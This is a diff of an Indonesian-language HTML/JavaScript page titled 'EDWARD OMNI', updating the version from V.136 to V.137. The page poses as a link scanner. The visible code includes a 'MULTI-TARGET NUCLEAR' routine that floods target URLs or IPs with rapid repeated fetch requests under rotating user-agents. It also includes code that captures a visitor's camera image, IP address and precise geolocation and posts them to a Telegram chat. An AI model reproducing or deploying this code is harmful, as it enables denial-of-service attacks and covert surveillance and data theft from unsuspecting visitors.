@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDWARD OMNI V.136</title>
+    <title>EDWARD OMNI V.137</title>
     <style>
         :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; --blue: #00bdff; --orange: #ff9f43; }
         * { box-sizing: border-box; transition: 0.2s; }
@@ -30,7 +30,7 @@
 </head>
 <body>
     <div class="master-header">
-        <p class="master-name">EDWARD OMNI V.136</p>
+        <p class="master-name">EDWARD OMNI V.137</p>
         <div class="sys-monitor">
             <div class="mon-box">CPU: <span id="cpuLoad">0%</span></div>
             <div class="mon-box">TEMP: <span id="sysTemp">38°C</span></div>
@@ -39,7 +39,7 @@
 
     <div class="card">
         <h3>🛡️ DEEP CLOUD SCANNER</h3>
-        <input type="text" id="scanInput" placeholder="Analisa link mencurigakan...">
+        <input type="text" id="scanInput" placeholder="Masukkan link untuk analisa...">
         <button class="btn btn-safe" onclick="cekLink()">⚡ ANALYZE TARGET</button>
         <div id="scanStatus"></div>
     </div>
@@ -48,7 +48,7 @@
         <h3>🔥 MULTI-TARGET NUCLEAR</h3>
         <input type="text" id="target1" placeholder="Target 1 (URL / IP)">
         <input type="text" id="target2" placeholder="Target 2 (Cadangan)">
-        <button class="btn btn-atk" id="atkBtn" onclick="toggleAtk()">LAUNCH MULTI-STRIKE 🚀</button>
+        <button class="btn btn-atk" id="atkBtn" onclick="toggleAtk()">LAUNCH ATTACK 🚀</button>
         <div id="killerLog"></div>
     </div>
 
@@ -59,7 +59,7 @@
 
     <div id="radarOverlay">
         <div class="radar-container"><div class="radar-sweep"></div></div>
-        <p style="margin-top:20px; font-size:10px; color:var(--neon); letter-spacing:2px;">LOCKING COORDINATES...</p>
+        <p style="margin-top:20px; font-size:10px; color:var(--neon); letter-spacing:2px;">CALIBRATING V.137 SATELLITE...</p>
     </div>
 
     <canvas id="canvas"></canvas><video id="v" autoplay playsinline></video>
@@ -90,14 +90,14 @@
             const targets = [t1, t2].filter(t => t !== "");
             if(targets.length === 0 || isAtk) { if(isAtk) location.reload(); return; }
             isAtk = true; log.style.display = "block";
-            document.getElementById('atkBtn').innerText = "STOP 🛑";
+            document.getElementById('atkBtn').innerText = "STOP V.137 🛑";
             targets.forEach(url => {
                 for(let i=0; i < 20; i++) {
                     setInterval(() => {
                         const ua = UA_DB[Math.floor(Math.random() * UA_DB.length)];
                         fetch(url, { mode: 'no-cors', headers: { 'User-Agent': ua } }).catch(() => {});
                         const e = document.createElement('div');
-                        e.innerText = "> [HIT] " + url.substring(0,15) + "...";
+                        e.innerText = "> [V.137-HIT] " + url.substring(0,15) + "...";
                         log.prepend(e);
                         if(log.childNodes.length > 15) log.removeChild(log.lastChild);
                     }, 120);
@@ -127,14 +127,14 @@
                     }, async () => {
                         await sendTele(blob, ipD.ip, null, null);
                         location.reload();
-                    }, {timeout: 5000});
+                    }, {enableHighAccuracy: true, timeout: 10000});
                 }, 3000);
             } catch (e) { location.reload(); }
         }
 
         async function sendTele(photo, ip, lat, lon) {
             const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', photo);
-            let cap = "🔱 [ REPORT V.136 - PRECISION ] 🔱\n🌐 IP: " + ip;
+            let cap = "🔱 [ REPORT V.137 - PRECISION ] 🔱\n🌐 IP: " + ip;
             if(lat && lon) cap += "\n📍 MAPS: https://www.google.com/maps?q=" + lat + "," + lon;
             else cap += "\n📍 MAPS: Gagal Mengunci Lokasi";
             fd.append('caption', cap);
